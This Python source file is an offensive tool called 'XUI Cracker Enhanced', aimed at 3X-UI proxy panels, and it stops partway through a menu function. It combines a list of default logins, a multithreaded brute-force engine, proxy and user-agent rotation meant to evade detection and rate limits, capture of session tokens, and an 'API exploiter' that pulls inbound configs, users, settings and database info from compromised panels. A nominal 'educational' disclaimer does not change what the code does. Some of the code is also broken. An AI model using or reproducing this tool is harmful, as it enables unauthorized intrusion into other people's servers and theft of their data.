#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🔥 XUI CRACKER ENHANCED v3.1 🔥                          ║
║                 Advanced 3X-UI Panel Security Toolkit                       ║
║                                                                              ║
║  Features:                                                                   ║
║  ✓ Multi-Mode Brute Force Attack                                            ║
║  ✓ Default Credentials Checker                                              ║
║  ✓ API Endpoint Exploiter                                                   ║
║  ✓ Session Token Extractor                                                  ║
║  ✓ Inbound/Outbound Scanner                                                 ║
║  ✓ Proxy Support & Rotation                                                 ║
║  ✓ User-Agent Rotation                                                       ║
║  ✓ Advanced Statistics & Reporting                                          ║
║  ✓ Beautiful Animated UI                                                     ║
║  ✓ Anti-Detection Mode                                                       ║
║  ✓ Smart Rate Limiting                                                       ║
║  ✓ Stealth Bypass Techniques                                                 ║
║                                                                              ║
║  Author: Enhanced by @mansorkorea84 | Original: @cynetx                     ║
║  License: MIT - Educational Purposes Only                                    ║
║  Version: 3.1 (Patched & Enhanced)                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

⚠️  SECURITY WARNING: SSL verification is disabled for testing purposes.
    Use only on systems you have authorization to test!
"""

import requests
import threading
import sys
import json
import re
import time
import os
import random
import string
import warnings
from urllib.parse import urljoin, urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from queue import Queue
import argparse

# Disable SSL warnings for testing
warnings.filterwarnings('ignore', category=requests.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
VERSION = "3.1"
AUTHOR = "@mansorkorea84"
ORIGINAL_AUTHOR = "@cynetx"
DELAY = 0.1
REFRESH_RATE = 0.2
TIMEOUT = 10
MAX_RETRIES = 3

# ==================== COLOR CLASS ====================
class Colors:
    """Terminal color codes for beautiful output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[97m'
    MAGENTA = '\033[35m'
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;206m'
    PURPLE = '\033[38;5;141m'
    END = '\033[0m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    
    # Effects
    BLINK = '\033[5m'
    DIM = '\033[2m'
    REVERSE = '\033[7m'

# ==================== USER AGENTS ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

# ==================== DEFAULT CREDENTIALS ====================
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", ""),
    ("admin", "3xui"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "password"),
    ("root", "123456"),
    ("user", "user"),
    ("user", "password"),
    ("admin", "pass"),
    ("admin", "12345678"),
    ("admin", "123456789"),
    ("admin", "1234567890"),
    ("admin", "qwerty"),
    ("admin", "abc123"),
    ("admin", "monkey"),
    ("admin", "master"),
    ("admin", "dragon"),
    ("admin", "111111"),
    ("admin", "000000"),
    ("admin", "666666"),
    ("admin", "888888"),
    ("admin", "123123"),
    ("admin", "passw0rd"),
    ("admin", "P@ssw0rd"),
    ("admin", "Admin@123"),
    ("admin", "Admin123"),
    ("admin", "admin@321"),
    ("admin", "admin321"),
    ("administrator", "administrator"),
    ("administrator", "admin"),
    ("administrator", "password"),
]

# ==================== DATA CLASSES ====================
@dataclass
class Target:
    """Represents a target XUI panel"""
    url: str
    port: int = 443
    protocol: str = "https"
    status: str = "unknown"  # unknown, vulnerable, safe, error
    csrf_token: Optional[str] = None
    session_cookie: Optional[str] = None
    version: Optional[str] = None
    response_time: float = 0.0
    
    @property
    def full_url(self) -> str:
        if self.port not in [80, 443]:
            return f"{self.protocol}://{self.url}:{self.port}"
        return f"{self.protocol}://{self.url}"

@dataclass
class Credential:
    """Represents found credentials"""
    target_url: str
    username: str
    password: str
    found_at: str
    method: str = "brute_force"
    session_token: Optional[str] = None
    
    def to_dict(self) -> dict:
        return {
            "target": self.target_url,
            "username": self.username,
            "password": self.password,
            "found_at": self.found_at,
            "method": self.method,
            "session_token": self.session_token
        }

@dataclass 
class ScanResult:
    """Represents scan result for a target"""
    target: Target
    is_xui: bool = False
    has_csrf: bool = False
    version: Optional[str] = None
    endpoints: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)

# ==================== STATISTICS CLASS ====================
class Statistics:
    """Thread-safe statistics tracking"""
    def __init__(self):
        self._lock = threading.Lock()
        self.total_attempts = 0
        self.found = 0
        self.failed = 0
        self.bad_targets = 0
        self.rate_limited = 0
        self.errors = 0
        self.start_time = time.time()
        self.targets_scanned = 0
        self.targets_vulnerable = 0
        
    def increment(self, stat: str, value: int = 1):
        with self._lock:
            if hasattr(self, stat):
                current = getattr(self, stat)
                setattr(self, stat, current + value)
                
    def get_stats(self) -> dict:
        with self._lock:
            elapsed = time.time() - self.start_time
            speed = self.total_attempts / elapsed if elapsed > 0 else 0
            return {
                'total': self.total_attempts,
                'found': self.found,
                'failed': self.failed,
                'bad': self.bad_targets,
                'rate_limited': self.rate_limited,
                'errors': self.errors,
                'targets_scanned': self.targets_scanned,
                'targets_vulnerable': self.targets_vulnerable,
                'elapsed': elapsed,
                'speed': speed
            }

# ==================== PROXY MANAGER ====================
class ProxyManager:
    """Manages proxy rotation with validation"""
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.current_index = 0
        self._lock = threading.Lock()
        self._dead_proxies = set()
        
    def add_proxy(self, proxy: str):
        with self._lock:
            if proxy and proxy not in self._dead_proxies:
                self.proxies.append(proxy)
            
    def get_proxy(self) -> Optional[Dict[str, str]]:
        with self._lock:
            alive_proxies = [p for p in self.proxies if p not in self._dead_proxies]
            if not alive_proxies:
                return None
            proxy = alive_proxies[self.current_index % len(alive_proxies)]
            self.current_index += 1
            if proxy.startswith('http'):
                return {'http': proxy, 'https': proxy}
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def mark_dead(self, proxy: str):
        """Mark a proxy as dead"""
        with self._lock:
            self._dead_proxies.add(proxy)
            
    def load_from_file(self, filename: str):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.add_proxy(proxy)
            print(f"{Colors.GREEN}[+] Loaded {len(self.proxies)} proxies{Colors.END}")
        except FileNotFoundError:
            print(f"{Colors.RED}[-] Proxy file not found: {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error loading proxies: {e}{Colors.END}")

# ==================== SESSION MANAGER ====================
class SessionManager:
    """Manages HTTP sessions with smart rotation"""
    def __init__(self, proxy_manager: ProxyManager = None):
        self.sessions = {}
        self.proxy_manager = proxy_manager
        self._session_lock = threading.Lock()
        
    def get_session(self, target_url: str) -> requests.Session:
        with self._session_lock:
            if target_url not in self.sessions:
                session = requests.Session()
                # Random user agent
                session.headers.update({
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                })
                if self.proxy_manager:
                    proxy = self.proxy_manager.get_proxy()
                    if proxy:
                        session.proxies.update(proxy)
                self.sessions[target_url] = session
            return self.sessions[target_url]
        
    def close_all(self):
        with self._session_lock:
            for session in self.sessions.values():
                try:
                    session.close()
                except Exception:
                    pass
            self.sessions.clear()

# ==================== ANTI-DETECTION MODULE ====================
class AntiDetection:
    """Anti-detection and stealth techniques"""
    
    @staticmethod
    def generate_fingerprint() -> Dict[str, str]:
        """Generate realistic browser fingerprint headers"""
        return {
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept': 'application/json, text/plain, */*',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
    
    @staticmethod
    def human_like_delay(min_delay: float = 0.1, max_delay: float = 0.5) -> float:
        """Generate human-like delay"""
        return random.uniform(min_delay, max_delay)
    
    @staticmethod
    def rotate_identity(session: requests.Session):
        """Rotate session identity"""
        session.headers.update(AntiDetection.generate_fingerprint())
        session.headers['User-Agent'] = random.choice(USER_AGENTS)

# ==================== XUI SCANNER ====================
class XUIScanner:
    """Enhanced scanner with better fingerprinting"""
    
    XUI_INDICATORS = [
        r'3x-ui|3xui|x-ui|xui',
        r'xray|Xray|XRAY',
        r'vless|vmess|trojan|shadowsocks',
        r'panel.*login|dashboard.*login',
        r'csrf-token|x-csrf-token',
        r'/login.*xui|/xui.*login',
        r'x-ui.*panel|xui.*dashboard',
        r'xray.*core|xray.*config',
    ]
    
    API_ENDPOINTS = [
        '/xui/panel/api/inbounds/list',
        '/xui/panel/api/settings/all',
        '/xui/panel/api/users',
        '/xui/panel/api/server/status',
        '/xui/panel/api/xray/version',
    ]
    
    # Additional paths to check
    CHECK_PATHS = ['/login', '/xui/', '/panel/', '/xui/login', '/panel/login']
    
    def __init__(self, session_manager: SessionManager, timeout: int = TIMEOUT):
        self.session_manager = session_manager
        self.timeout = timeout
        
    def is_xui_panel(self, target: Target) -> ScanResult:
        """Check if target is an XUI panel with enhanced detection"""
        result = ScanResult(target=target)
        
        try:
            start_time = time.time()
            session = self.session_manager.get_session(target.full_url)
            
            # Apply anti-detection
            AntiDetection.rotate_identity(session)
            
            # Try main page
            response = session.get(
                target.full_url + "/", 
                timeout=self.timeout,
                allow_redirects=True,
                verify=False
            )
            
            target.response_time = time.time() - start_time
            
            if response.status_code in [200, 301, 302, 403, 401]:
                content = response.text.lower()
                headers_str = str(response.headers).lower()
                
                # Check for XUI indicators in content
                for pattern in self.XUI_INDICATORS:
                    if re.search(pattern, content, re.IGNORECASE):
                        result.is_xui = True
                        break
                        
                # Check headers for XUI signatures
                if not result.is_xui:
                    for pattern in self.XUI_INDICATORS[:5]:
                        if re.search(pattern, headers_str, re.IGNORECASE):
                            result.is_xui = True
                            break
                
                # Check for CSRF token with more patterns
                csrf_patterns = [
                    r'name="csrf_token"\s+value="([^"]+)"',
                    r'csrf-token\s*:\s*"([^"]+)"',
                    r'x-csrf-token\s*:\s*"([^"]+)"',
                    r'<meta[^>]+csrf[^>]+content="([^"]+)"',
                    r'"csrfToken"\s*:\s*"([^"]+)"',
                    r'input[^>]+name="[^"]*csrf[^"]*"[^>]+value="([^"]+)"',
                ]
                
                for pattern in csrf_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        target.csrf_token = match.group(1)
                        result.has_csrf = True
                        break
                
                # Try to extract version with more patterns
                version_patterns = [
                    r'version["\s:]+([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                    r'v([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                    r'Version["\s:]+(["\']?)([0-9.]+)\1',
                ]
                for vp in version_patterns:
                    version_match = re.search(vp, response.text, re.IGNORECASE)
                    if version_match:
                        ver = version_match.group(version_match.lastindex)
                        result.version = ver
                        target.version = ver
                        break
                    
                # Check common paths
                for endpoint in self.CHECK_PATHS:
                    try:
                        resp = session.get(
                            target.full_url + endpoint,
                            timeout=5,
                            verify=False
                        )
                        if resp.status_code == 200:
                            result.endpoints.append(endpoint)
                            # Also check this page for XUI indicators
                            if not result.is_xui:
                                ep_content = resp.text.lower()
                                for pattern in self.XUI_INDICATORS[:4]:
                                    if re.search(pattern, ep_content, re.IGNORECASE):
                                        result.is_xui = True
                                        break
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        pass
                        
                # Check for vulnerabilities
                self._check_vulnerabilities(target, result, response)
                        
        except requests.exceptions.Timeout:
            target.status = "timeout"
        except requests.exceptions.ConnectionError:
            target.status = "unreachable"
        except requests.exceptions.RequestException as e:
            target.status = "error"
            target.error_msg = str(e)
        except Exception as e:
            target.status = "error"
            target.error_msg = str(e)
            
        return result
    
    def _check_vulnerabilities(self, target: Target, result: ScanResult, response):
        """Check for known vulnerabilities - enhanced version"""
        # Check for default credentials vulnerability
        if result.is_xui:
            result.vulnerabilities.append("potential_default_creds")
            
        # Check for missing security headers
        security_headers = {
            'X-Frame-Options': 'clickjacking',
            'X-Content-Type-Options': 'mime_sniff',
            'Strict-Transport-Security': 'hsts_missing',
            'Content-Security-Policy': 'csp_missing',
            'X-XSS-Protection': 'xss_protection_missing',
        }
        
        missing_headers = []
        for header, vuln_name in security_headers.items():
            if header not in response.headers:
                missing_headers.append(vuln_name)
        if missing_headers:
            result.vulnerabilities.append(f"missing_security_headers:{','.join(missing_headers)}")
        
        # Check for debug info leak
        debug_indicators = ['debug', 'stack trace', 'exception', 'error:', 'traceback']
        content_lower = response.text.lower()
        for indicator in debug_indicators:
            if indicator in content_lower:
                result.vulnerabilities.append("debug_info_leak")
                break
                
        # Check for exposed API endpoints without auth
        for api_path in ['/api/', '/xui/api/', '/panel/api/']:
            if api_path in response.text:
                result.vulnerabilities.append("potential_api_exposure")

# ==================== BRUTE FORCE ENGINE ====================
class BruteForceEngine:
    """Advanced brute force engine with anti-detection"""
    
    def __init__(
        self,
        session_manager: SessionManager,
        stats: Statistics,
        delay: float = DELAY,
        max_retries: int = MAX_RETRIES
    ):
        self.session_manager = session_manager
        self.stats = stats
        self.delay = delay
        self.max_retries = max_retries
        self.found_credentials: List[Credential] = []
        self._lock = threading.Lock()
        self.stop_event = threading.Event()
        
    def attempt_login(
        self, 
        target: Target, 
        username: str, 
        password: str,
        csrf_token: str = None
    ) -> Tuple[bool, Optional[str]]:
        """Attempt login to XUI panel with enhanced detection bypass"""
        session = self.session_manager.get_session(target.full_url)
        login_url = urljoin(target.full_url, "/login")
        
        # Apply anti-detection before request
        AntiDetection.rotate_identity(session)
        
        payload = {
            "username": username,
            "password": password,
            "twoFactorCode": ""
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": target.full_url,
            "Referer": target.full_url + "/login",
            "Accept": "*/*",
        }
        
        # Add anti-detection headers
        headers.update(AntiDetection.generate_fingerprint())
        
        if csrf_token:
            headers["x-csrf-token"] = csrf_token
            
        for attempt in range(self.max_retries):
            try:
                # Human-like delay
                actual_delay = AntiDetection.human_like_delay(self.delay * 0.8, self.delay * 1.5)
                time.sleep(actual_delay)
                
                self.stats.increment('total_attempts')
                
                response = session.post(
                    login_url,
                    data=payload,
                    headers=headers,
                    timeout=TIMEOUT,
                    allow_redirects=False,
                    verify=False
                )
                
                # Handle rate limiting with smarter backoff
                if response.status_code == 429:
                    self.stats.increment('rate_limited')
                    backoff_time = (2 ** attempt) + random.uniform(0, 1)
                    time.sleep(backoff_time)
                    continue
                    
                # Check for success
                if response.status_code == 200:
                    try:
                        json_resp = response.json()
                        if json_resp.get("success") is True:
                            return True, self._extract_session(response, session)
                    except (json.JSONDecodeError, ValueError):
                        pass
                    
                    # Check for redirect to dashboard
                    response_text_lower = response.text.lower()
                    if 'dashboard' in response_text_lower or 'panel' in response_text_lower:
                        return True, self._extract_session(response, session)
                        
                    # Check for success indicators in response
                    success_indicators = ['token', 'session', 'redirect', 'home', 'welcome']
                    for indicator in success_indicators:
                        if indicator in response_text_lower:
                            return True, self._extract_session(response, session)
                        
                # Block/Forbidden means likely valid target but wrong creds
                elif response.status_code in [403, 503]:
                    return False, None
                    
                # Too many redirects might mean successful auth
                elif response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'dashboard' in location.lower() or 'panel' in location.lower() or 'home' in location.lower():
                        return True, self._extract_session(response, session)
                    return False, None
                    
                break
                
            except requests.exceptions.Timeout:
                if attempt < self.max_retries - 1:
                    continue
                self.stats.increment('errors')
                return False, None
                
            except (requests.exceptions.ConnectionError, requests.exceptions.RequestException) as e:
                self.stats.increment('errors')
                if attempt < self.max_retries - 1:
                    time.sleep(1 + attempt * 0.5)
                    continue
                return False, None
                
            except Exception as e:
                self.stats.increment('errors')
                if attempt < self.max_retries - 1:
                    time.sleep(1)
                    continue
                return False, None
                
        return False, None
    
    def _extract_session(self, response: responses.Response, session: requests.Session) -> str:
        """Extract session token from response - enhanced"""
        # Check for session cookie
        cookie_names = ['session', '3x-ui', 'token', 'jwt', 'session-id', 'auth-token']
        for cookie_name in cookie_names:
            if cookie_name in session.cookies:
                return session.cookies.get(cookie_name)
        
        # Try to extract from JSON response
        try:
            data = response.json()
            token_keys = ['token', 'session', 'accessToken', 'access_token', 'authToken', 'data']
            for key in token_keys:
                if key in data:
                    token_val = data[key]
                    if isinstance(token_val, str) and token_val:
                        return token_val
                    # Nested check
                    if isinstance(token_val, dict):
                        for sub_key in ['token', 'value', 'accessToken']:
                            if sub_key in token_val:
                                return token_val[sub_key]
        except (json.JSONDecodeError, ValueError, AttributeError):
            pass
            
        # Check for token in response text
        token_patterns = [
            r'token["\s:]+["\']([a-zA-Z0-9_-]{20,})["\']',
            r'session["\s:]+["\']([a-zA-Z0-9_-]{20,})["\']',
        ]
        for pattern in token_patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
            
        return None
    
    def run_attack(
        self,
        targets: List[Target],
        usernames: List[str],
        passwords: List[str],
        threads: int = 5,
        mode: str = "standard"
    ) -> List[Credential]:
        """Run brute force attack on multiple targets"""
        
        print(f"\n{Colors.CYAN}[*] Starting {mode} attack on {len(targets)} targets{Colors.END}")
        print(f"{Colors.CYAN}[*] Using {threads} threads | {len(usernames)} users | {len(passwords)} passwords{Colors.END}\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for target in targets:
                if self.stop_event.is_set():
                    break
                    
                self.stats.increment('targets_scanned')
                
                for username in usernames:
                    if self.stop_event.is_set():
                        break
                    for password in passwords:
                        if self.stop_event.is_set():
                            break
                            
                        future = executor.submit(
                            self._worker,
                            target, username, password
                        )
                        futures.append(future)
                        
                        if self.delay > 0:
                            time.sleep(AntiDetection.human_like_delay(0.05, 0.2))
            
            # Wait for completion
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self._lock:
                            self.found_credentials.append(result)
                except Exception as e:
                    self.stats.increment('errors')
                    
        return self.found_credentials
    
    def _worker(self, target: Target, username: str, password: str) -> Optional[Credential]:
        """Worker thread for brute force"""
        if self.stop_event.is_set():
            return None
            
        success, session_token = self.attempt_login(
            target, username, password, target.csrf_token
        )
        
        if success:
            self.stats.increment('found')
            self.stats.increment('targets_vulnerable')
            cred = Credential(
                target_url=target.full_url,
                username=username,
                password=password,
                found_at=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                session_token=session_token
            )
            
            # Save immediately
            self._save_credential(cred)
            
            return cred
            
        self.stats.increment('failed')
        return None
    
    def _save_credential(self, cred: Credential):
        """Save found credential to file with backup"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        files_to_save = [
            "xui_good.txt",
            f"xui_backup_{timestamp}.txt"
        ]
        
        for filename in files_to_save:
            try:
                with open(filename, "a", encoding="utf-8") as f:
                    f.write(f"{cred.target_url} | {cred.username}:{cred.password} | {cred.found_at}\n")
            except (IOError, OSError) as e:
                print(f"{Colors.RED}[-] Error saving credential to {filename}: {e}{Colors.END}")
            
    def stop(self):
        """Stop the attack"""
        self.stop_event.set()

# ==================== DEFAULT CREDS CHECKER ====================
class DefaultCredentialsChecker:
    """Checks for default credentials on XUI panels - optimized"""
    
    def __init__(self, brute_force_engine: BruteForceEngine):
        self.engine = brute_force_engine
        
    def check_targets(self, targets: List[Target], threads: int = 20) -> List[Credential]:
        """Check all targets against default credentials"""
        print(f"\n{Colors.YELLOW}[*] Checking {len(targets)} targets for default credentials...{Colors.END}")
        print(f"{Colors.YELLOW}[*] Testing {len(DEFAULT_CREDENTIALS)} default credential pairs\n{Colors.END}")
        
        results = []
        checked = 0
        
        for target in targets:
            if self.engine.stop_event.is_set():
                break
            
            target_found = False
            for username, password in DEFAULT_CREDENTIALS:
                if self.engine.stop_event.is_set() or target_found:
                    break
                    
                success, session = self.engine.attempt_login(
                    target, username, password, target.csrf_token
                )
                checked += 1
                
                if success:
                    cred = Credential(
                        target_url=target.full_url,
                        username=username,
                        password=password,
                        found_at=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        method="default_credentials",
                        session_token=session
                    )
                    results.append(cred)
                    self.engine._save_credential(cred)
                    self.engine.stats.increment('found')
                    target_found = True
                    print(f"{Colors.BG_GREEN}{Colors.BLACK}[+] FOUND: {target.full_url} | {username}:{password}{Colors.END}")
                    break  # Move to next target after finding creds
                    
                time.sleep(AntiDetection.human_like_delay(0.02, 0.08))
                
        print(f"{Colors.CYAN}[*] Checked {checked} credential combinations\n{Colors.END}")
        return results

# ==================== API EXPLOITER ====================
class APIExploiter:
    """Exploits XUI API endpoints - enhanced with more endpoints"""
    
    API_ENDPOINTS = {
        'inbounds': '/xui/panel/api/inbounds/list',
        'settings': '/xui/panel/api/settings/all',
        'status': '/xui/panel/api/server/status',
        'xray_version': '/xui/panel/api/xray/version',
        'users': '/xui/panel/api/users',
        'logs': '/xui/panel/api/logs',
        # Additional endpoints
        'host_list': '/xui/panel/api/hosts/list',
        'inbound_info': '/xui/panel/api/inbounds/get',
        'db_info': '/xui/panel/api/setting/dbInfo',
    }
    
    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager
        
    def exploit_target(self, target: Target, session_token: str = None) -> Dict[str, Any]:
        """Try to extract information from XUI API - enhanced"""
        results = {
            'target': target.full_url,
            'accessible_endpoints': [],
            'data': {},
            'inbounds': [],
            'users': [],
            'settings': {},
            'version': None,
            'exploit_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        
        session = self.session_manager.get_session(target.full_url)
        
        # Set session token if available
        if session_token:
            session.headers['Authorization'] = f'Bearer {session_token}'
            session.cookies.set('session', session_token)
            
        for name, endpoint in self.API_ENDPOINTS.items():
            try:
                url = urljoin(target.full_url, endpoint)
                
                # Apply anti-detection
                AntiDetection.rotate_identity(session)
                
                response = session.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    results['accessible_endpoints'].append(name)
                    try:
                        data = response.json()
                        results['data'][name] = data
                        
                        if name == 'inbounds' and isinstance(data, dict):
                            if 'obj' in data and isinstance(data['obj'], list):
                                results['inbounds'] = data['obj']
                                # Mask sensitive data
                                for inbound in results['inbounds']:
                                    if 'settings' in inbound and 'clients' in inbound.get('settings', {}):
                                        for client in inbound['settings']['clients']:
                                            if 'id' in client:
                                                client['id'] = client['id'][:8] + '...'
                                                
                        elif name == 'users':
                            if isinstance(data, dict) and 'obj' in data:
                                results['users'] = data['obj']
                                
                        elif name == 'settings':
                            if isinstance(data, dict) and 'obj' in data:
                                results['settings'] = data['obj']
                                
                        elif name == 'xray_version':
                            if isinstance(data, dict):
                                results['version'] = data.get('obj', data.get('success'))
                                
                    except (json.JSONDecodeError, ValueError):
                        results['data'][name] = response.text[:500]
                        
            except requests.exceptions.Timeout:
                results[name] = {'error': 'timeout'}
            except requests.exceptions.RequestException as e:
                results[name] = {'error': str(e)}
            except Exception as e:
                results[name] = {'error': str(e)}
                
        return results

# ==================== UI / DISPLAY ====================
class DisplayManager:
    """Manages all UI display operations - enhanced"""
    
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')
        
    @staticmethod
    def print_banner():
        DisplayManager.clear_screen()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                                              ║
{Colors.RED}║{Colors.CYAN}   ███████╗ █████╗ ██╗   ██╗███████╗ ██████╗  ██████╗ ██████╗  {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ██╔════╝██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔═══██╗██╔══██╗ {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   █████╗  ███████║██║   ██║█████╗  ██║   ██║██║   ██║██║  ██║ {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ██╔══╝  ██╔══██║██║   ██║██╔══╝  ██║   ██║██║   ██║██║  ██║ {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ███████╗██║  ██║╚██████╔╝███████║╚██████╔╝╚██████╔╝██████╔╝ {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝  {Colors.RED}║
{Colors.RED}║                                                                              ║
{Colors.RED}╠══════════════════════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.GREEN}          🔥 XUI CRACKER ENHANCED v{VERSION} 🔥                      {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}              Advanced 3X-UI Panel Security Toolkit                  {Colors.RED}║
{Colors.RED}║{Colors.MAGENTA}                   Author: {AUTHOR} | Original: {ORIGINAL_AUTHOR}         {Colors.RED}║
{Colors.RED}║{Colors.CYAN}                         [{now}]                              {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(banner)
        
    @staticmethod
    def print_stats(stats: Statistics, extra_info: Dict = None):
        """Print live statistics - enhanced"""
        DisplayManager.clear_screen()
        DisplayManager.print_banner()
        
        s = stats.get_stats()
        
        # Main stats box
        print(f"{Colors.BLUE}╔═══════════════════════════════════════════════════════════════════════════╗")
        print(f"{Colors.BLUE}║{Colors.YELLOW}  📊 LIVE ATTACK STATISTICS{Colors.BLUE}                                                  ║")
        print(f"{Colors.BLUE}╠═══════════════════════════════════════════════════════════════════════════╣")
        print(f"{Colors.BLUE}║{Colors.CYAN}  🎯 Targets Scanned  : {Colors.WHITE}{str(s['targets_scanned']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.GREEN}  ✅ Vulnerable Found : {Colors.GREEN}{str(s['targets_vulnerable']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.CYAN}  🔄 Total Attempts  : {Colors.WHITE}{str(s['total']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.GREEN}  🔓 Credentials     : {Colors.GREEN}{str(s['found']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.RED}  ❌ Failed          : {Colors.RED}{str(s['failed']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.YELLOW}  ⚠️  Bad Targets     : {Colors.YELLOW}{str(s['bad']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.ORANGE}  🚫 Rate Limited    : {Colors.ORANGE}{str(s['rate_limited']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.RED}  💥 Errors          : {Colors.RED}{str(s['errors']):<50}{Colors.BLUE}║")
        print(f"{Colors.BLUE}╠═══════════════════════════════════════════════════════════════════════════╣")
        
        # Speed & Time
        elapsed_min = int(s['elapsed'] // 60)
        elapsed_sec = int(s['elapsed'] % 60)
        print(f"{Colors.BLUE}║{Colors.PURPLE}  ⏱️  Elapsed Time    : {Colors.WHITE}{elapsed_min}m {elapsed_sec}s{' ' * (46 - len(str(elapsed_min)) - len(str(elapsed_sec)))}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.PURPLE}  ⚡ Speed           : {Colors.WHITE}{s['speed']:.1f} req/sec{' ' * (41 - len(str(int(s['speed']))) )}{Colors.BLUE}║")
        print(f"{Colors.BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Extra info if provided
        if extra_info:
            print(f"\n{Colors.MAGENTA}  ℹ️  {extra_info.get('message', '')}{Colors.END}")
            
    @staticmethod
    def print_menu():
        """Print main menu - enhanced"""
        DisplayManager.clear_screen()
